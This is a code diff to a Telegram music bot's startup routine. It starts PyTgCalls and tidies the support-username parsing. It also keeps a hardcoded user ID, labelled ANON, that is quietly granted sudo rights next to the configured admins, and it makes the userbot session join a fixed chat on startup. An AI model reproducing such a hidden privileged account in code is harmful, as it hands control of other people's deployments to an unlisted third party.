@@ -41,9 +41,15 @@ app2 = Client(
     session_string=STRING_SESSION
 )
 
+# Pytgcalls v2.x initialization
 pytgcalls = PyTgCalls(app2)
+
 SUDOERS = filters.user()
-SUNAME = config.SUPPORT_CHAT.split("me/")[1] if "me/" in config.SUPPORT_CHAT else config.SUPPORT_CHAT
+# Fixed logic for Support Username
+if "me/" in config.SUPPORT_CHAT:
+    SUNAME = config.SUPPORT_CHAT.split("me/")[1]
+else:
+    SUNAME = config.SUPPORT_CHAT.replace("@", "")
 
 async def Stenzle_startup():
     os.system("clear")
@@ -65,23 +71,26 @@ async def Stenzle_startup():
     ASS_USERNAME = getme2.username
     ASS_MENTION = getme2.mention
     
+    # Start Pytgcalls
+    await pytgcalls.start()
+    
     try:
         await app2.join_chat("KURUK_SHE_TRA")
     except:
         pass
 
     # Sudoers Setup
-    ANON = "1356469075"
+    ANON = 1356469075
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
-    SUDOERS.add(int(ANON))
+    SUDOERS.add(ANON)
 
     Stenzledb = {}
     LOGGER.info("[•] Stenzle Music Clients Booted Successfully.")
     
-    # KEEP RUNNING: idle() must be the last thing inside the startup function
+    # KEEP RUNNING
     await idle()
     
     # Graceful shutdown
